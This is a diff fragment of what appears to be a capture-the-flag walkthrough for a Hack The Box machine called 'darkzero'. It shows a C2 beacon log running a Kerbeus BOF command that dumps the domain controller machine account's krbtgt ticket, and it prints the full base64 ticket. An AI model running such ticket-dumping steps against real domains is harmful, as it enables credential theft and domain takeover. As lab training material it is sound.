@@ -908,5 +908,43 @@ Action: List Kerberos Tickets (All Users)
 Ill list the tickets, im targeting the dc01 
 
 ```python
++--- Task [6ccf7130] closed ----------------------------------------------------------+
 
+[20/08 22:10:22] ethan [ca1efd19] beacon > kerbeus dump /user:DC01$ /service:krbtgt
+[20/08 22:10:22] [*] Task: Kerbeus DUMP
+[20/08 22:10:25] [*] Agent called server, sent [18.15 Kb]
+[20/08 22:10:25] [+] BOF output
+
+Action: List Kerberos Tickets for 'DC01$'
+
+[*] Target service  : krbtgt
+[*] Target user     : DC01$
+
+UserName                : DC01$
+Domain                  : darkzero
+LogonId                 : 0:0x282219
+Session                 : 0
+UserSID                 : S-1-5-21-1152179935-589108180-1989892463-1000
+Authentication package  : Kerberos
+LogonServer             : 
+UserPrincipalName       : 
+
+[*] Cached tickets: (1)
+
+  [0]
+	ClientName               :  DC01$ @ DARKZERO.HTB
+	ServiceRealm             :  krbtgt/DARKZERO.HTB @ DARKZERO.HTB
+	StartTime (UTC)          :  20.08.2026 16:05:51
+	EndTime (UTC)            :  21.08.2026 02:05:50
+	RenewTill (UTC)          :  27.08.2026 16:05:50
+	Flags                    :  forwardable forwarded renewable pre_authent enc_pa_rep 
+	KeyType                  :  aes256_cts_hmac_sha1
+
+	doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDaClErSDym0H7vKdInRS0hDerSC3yUPH7q0yk/y5pngjQEOznNkFALa0YgSvN7YbAUr6kU0Z31kOWO+W+5LmNCZOHNLE7L8d7eX5LNRTzM+uFi1KloxnU+9kc0HxiLdtbVqiLQVQMloXATpPzFSADhyJK1pDZ6DfiZXXOb3BiqrqK2JQExLfzQZYqyZ9eLKJF4Rha9oIShTT9Dqtlbnq1teQGZ4J9OBXPOdRhlauw3gT0t3mRyEsKhITAAHtWnxPu6H0f1h/am3s7oG34lEV/zslImIyU8OmHh0G2rK1b6vXAQcErsVrEvq35HgA9nPmB8PM0YznlGtZWk4BINnVnxrepTpLcMMNCFkqkVPz4UlYrZMwfP9VgzyN0txurxNFJphL4muifa8PGx9PzZ6ck7uRZztnY8uJenn+uAs3o4bF4vw24RZALUlbNioKZVPyOTW4dwxhhA/lfmbwSef+uK7nq3OGZfA+ks6irhQAgeU2zWkhrHKhRUVhbyVsGvg6uf3NUj4/CvDo+dXK6zHaeUyLmIwh/pmUjnc+MP0DyhK/kkhNVzkNLhd9Sshw3qmoRsNIyZU0yuTNiSJY2BH1o7MBIzJCODO05+fLomg5RRFFuQgwe+qKppNFQ9k6c9DfCy9h+AEdhXqr9CTENphoQrxbZIzNpV7yNZyG8EKi74s3AL+KW0tE1EggSo0QfRJgGhLUt6CY6DZ0vGg/9V9MKldWQ1ftORTqCUtjuCsL9rbJ/WE2JF2UBBbzLCw3JHfEm0TVZaLqxRawsghd/BAihRQ7yNMgbLA25YFgjmcS0ohB56KVvnhp1H5kIZ4BaakWyPZFsjB5xPvQHY66b5sY2Q4L314NCI2Wom9RYC2LtVb3832LpS0yFERb+keRjMfqSkWF2hv/mxw3Q5Oz7MyurgeXnPkM+vW883dk3Eu/ZZz5keCjdTm8cgHX6zURN2VxI2skML+cIk6WZNjfnjRTMHs4OpqbAGSN/3CYlVpDm9oYsyWXC/y2RAAqIK69Piuyf0AtyMdgRfndzqqrxQ5uQNYJDBWTYjt09yJw+3RVcxGnTRT8SInSA6qTk91Xo2HNpnAdaiuT2ily3Nu4Dkb19zOxIr41xqEhkTDEJC6NGgfOK+By1iVfVaj3Hj6dJlJYA60uGNF+h71J5ZR+yruR5is9ZzMvi92/YCf4E3XoWAk4nOrzCh7Ia1zdBdkpSlaEibN1k61bc+Ryv6k6Xhxk91ucYMZU9kNFsLtcYOfz/dy5R9dXn/0ew31Jj8eYRwyVDjjq/h1K++Z6BNDnrWnk80j9QFltRARpj1+TzKcsHGt0NLS4KQtDfVeOHC9FDf5Hi1IOUPdnxR+Z8ROKQxlODiqhxx/ucvaJNEcfdsfaUkEtbLCsME4AUrxGkKwfcryLGXI8O1901L/MwjyNgzl8VuRP38zLSfDo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgpgldsgNlBUT7MwTQuTRH+v02njnk4tEjoRt67550cvShDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNjA4MjAxNjA1NTFaphEYDzIwMjYwODIxMDIwNTUwWqcRGA8yMDI2MDgyNzE2MDU1MFqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=
+[20/08 22:10:25] [+] BOF finished
+
++--- Task [ca1efd19] closed ----------------------------------------------------------+
 ```
+
+Now ill dump the ticket!
+
